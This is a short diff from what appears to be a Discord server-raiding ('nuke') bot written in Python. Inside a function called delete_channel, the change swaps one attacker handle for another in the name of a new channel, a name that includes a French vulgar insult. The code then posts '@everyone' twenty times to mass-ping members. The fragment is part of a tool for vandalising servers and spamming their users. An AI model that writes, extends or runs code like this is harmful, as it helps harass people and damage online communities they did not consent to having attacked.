@@ -62,7 +62,7 @@ async def delete_channel(channel):
     
    
     try:
-        new_channel = await channel.guild.create_text_channel("by xDatabase Jte bz ta mère")
+        new_channel = await channel.guild.create_text_channel("by N3tBreach Jte bz ta mère")
         for i in range(20):
             await new_channel.send("@everyone")
         print(f"{new_channel.name} créé")
